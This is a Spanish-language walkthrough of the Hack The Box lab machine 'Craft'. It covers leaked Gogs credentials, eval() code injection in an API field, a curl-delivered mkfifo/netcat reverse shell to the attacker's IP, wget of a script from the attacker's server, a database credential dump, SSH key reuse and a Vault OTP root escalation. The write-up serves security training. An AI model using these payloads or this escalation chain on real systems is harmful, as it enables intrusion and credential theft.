---
title: Craft
description: Craft
sidebar:
  badge:
    text: Medium
    variant: caution
tags:
  - htb
  - linux
  - medium
  - eval-injection
  - docker-escape
  - gogs
  - hardcoded-credentials
  - hashicorp-vault
  - ssh-private-key
---

## 1. Reconocimiento

### Escaneo de puertos

```bash
nmap -sV -sT -sC -o nmapinitial 10.129.63.15

PORT    STATE SERVICE  VERSION
22/tcp  open  ssh      OpenSSH 7.4p1 Debian 10+deb9u6 (protocol 2.0)
443/tcp open  ssl/http nginx 1.15.8
| ssl-cert: Subject: commonName=craft.htb
```

Solo dos puertos abiertos. El 443 sirve una web bajo HTTPS con hostname `craft.htb`. Configuramos `/etc/hosts`:

```bash
sudo nano /etc/hosts
# Añadir:
# 10.129.63.15   craft.htb api.craft.htb gogs.craft.htb
```

### Enumeración de subdominios

Revisando el código fuente y los enlaces de la web principal encontramos dos subdominios:

```bash
https://api.craft.htb   → API REST de la aplicación
https://gogs.craft.htb  → Instancia de Gogs (Git self-hosted)
```

Añadirlos todos al `/etc/hosts` antes de continuar.

### Reconocimiento en Gogs

Navegamos por los repositorios públicos de `gogs.craft.htb`. En el historial de commits del repo `Craft/craft-api` encontramos credenciales hardcodeadas:

`https://gogs.craft.htb/Craft/craft-api/commit/a2d28ed1554adddfcfb845879bfea09f976ab7c1`

```bash
response = requests.get(
    'https://api.craft.htb/api/auth/login',
    auth=('dinesh', '4aUh0A8PbVJxgd'),
    verify=False
)
```

También en otro commit encontramos la lógica vulnerable de la API:

`https://gogs.craft.htb/Craft/craft-api/commit/c414b160578943acfe2e158e89409623f41da4c6`

```bash
# Fragmento del endpoint POST /api/brew/
if eval('%s > 1' % request.json['abv']):
    return "ABV must be a decimal value less than 1.0", 400
```

El valor `abv` del JSON se pasa directamente a `eval()` — inyección de código Python sin sanitización.

---

## 2. Vector de entrada

El endpoint `POST /api/brew/` usa `eval()` sobre el campo `abv` del body JSON sin ningún tipo de validación. Podemos inyectar código Python arbitrario para obtener RCE.

Antes de explotar necesitamos un token JWT válido.

### Pasos

**Paso 1 — Obtener token JWT con las credenciales encontradas**

```bash
curl -k -u dinesh:4aUh0A8PbVJxgd https://api.craft.htb/api/auth/login
```

```bash
{
  "token": "eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VyIjoiZGluZXNoIiwiZXhwIjoxNzc4MDA2NjExfQ.Yvlw7YlQlhjcRxet364kiE0kwKyp5qCX_doloUS1hlA"

```

**Paso 2 — Levantar listener**

```bash
nc -lvp 4444
```

**Paso 3 — Enviar payload RCE vía eval-injection en el campo `abv`**

El payload usa `__import__("os").system(...)` para ejecutar una reverse shell. El token del paso anterior va en el header `X-Craft-API-Token`.

```bash
curl -k -X POST https://api.craft.htb/api/brew/ \
  -H "X-Craft-API-Token: <TOKEN>" \
  -H "Content-Type: application/json" \
  -d '{
    "id": 0,
    "name": "pwned",
    "brewer": "pwned",
    "style": "pwned",
    "abv": "__import__(\"os\").system(\"rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.188 4444 >/tmp/f\")"
  }'
```

---

## 3. Acceso inicial

```bash
nc -lvp 4444

connect to [10.10.14.188] from craft.htb [10.129.63.15] 42121
/bin/sh: can't access tty; job control turned off
/opt/app # id
uid=0(root) gid=0(root) groups=0(root),...
```

Somos `root` dentro de un **contenedor Docker** (no en el host real). La app corre dentro de un container, así que necesitamos pivotar al host.

---

## 4. Escalada de privilegios

### Paso 1 — Extraer credenciales de la base de datos

Dentro del contenedor existe un script de test (`dbtest.py` o similar) que conecta a la BD. Lo descargamos desde nuestra máquina:

```bash
# En nuestra máquina: levantar servidor HTTP
python3 -m http.server 8000
```

```bash
# En el contenedor:
wget http://10.10.14.188:8000/dbtest1.py
python dbtest1.py
```

```bash
# Contenido de dbtest1.py que ejecutamos:
import pymysql
# (conecta a la BD de craft con las credenciales del settings.py del repo)

[
  {'id': 1, 'username': 'dinesh',   'password': '4aUh0A8PbVJxgd'},
  {'id': 4, 'username': 'ebachman', 'password': 'llJ77D8QFkLPQB'},
  {'id': 5, 'username': 'gilfoyle', 'password': 'ZEU3N8WNM2rh4T'}
]
```

### Paso 2 — Acceder a Gogs con las credenciales de gilfoyle

Usamos `gilfoyle:ZEU3N8WNM2rh4T` para autenticarnos en `gogs.craft.htb`. En sus repositorios privados encontramos un repo llamado `craft-infra` que contiene una **clave privada SSH**.

```bash
----BEGIN OPENSSH PRIVATE KEY-----
b3BlbnNzaC1rZXktdjEAAAAACmFlczI1Ni1jdHIAAAAGYmNyeXB0AAAAGAAAABDD9Lalqe
...
----END OPENSSH PRIVATE KEY-----
```

### Paso 3 — Conectar al host real via SSH con la clave privada de gilfoyle

```bash
# Guardamos la clave y le damos permisos
nano ssh.key   # pegamos la clave privada
chmod 600 ssh.key

ssh -i ssh.key gilfoyle@craft.htb

# La clave está protegida con passphrase — usar la contraseña encontrada:
Enter passphrase for key 'ssh.key': ZEU3N8WNM2rh4T

gilfoyle@craft:~$
```

Ya estamos en el host real como `gilfoyle`.

### Paso 4 — Enumeración de privesc (Vault / secrets)

```bash
sudo -l

# Sin resultados útiles directos
```

```bash
vault token lookup
# o revisar:
ls -la /home/gilfoyle/.vault-token
cat /home/gilfoyle/.vault-token
```

La máquina corre **HashiCorp Vault**. El token de gilfoyle tiene acceso a un secret de SSH que permite generar un OTP para autenticarse como `root`.

```bash
vault ssh -mode=otp -role=root_otp root@localhost

OTP: xxxxxxxx-xxxx-xxxx-xxxx-xxxxxxxxxxxx
root@craft:~#
```

---

## 5. Flags

```bash
user.txt: (en /home/gilfoyle/user.txt)
root.txt: (en /root/root.txt)
```

---

## 6. Lecciones aprendidas

- **Revisar siempre el historial de commits en Git**: las credenciales eliminadas en un commit posterior siguen siendo visibles en el historial.
- **`eval()` sobre input de usuario = RCE garantizado**: cualquier framework que pase datos externos a `eval()`/`exec()` sin sanitizar es vulnerable, independientemente del lenguaje.
- **Los contenedores Docker no son el límite**: obtener root en un container es el punto de partida, no el final. Siempre buscar credenciales, claves SSH, o tokens que permitan pivotar al host.
- **HashiCorp Vault con SSH OTP**: si Vault está activo y el rol `root_otp` está mal configurado, cualquier usuario con token válido puede obtener acceso root al host. Buscar `.vault-token` en homes de usuarios.
- **En máquinas similares buscar**: instancias Gogs/Gitea/GitLab públicas, commits con credenciales, APIs con `eval`/`exec`, y tokens de Vault o AWS en variables de entorno del container (`env` dentro del container).
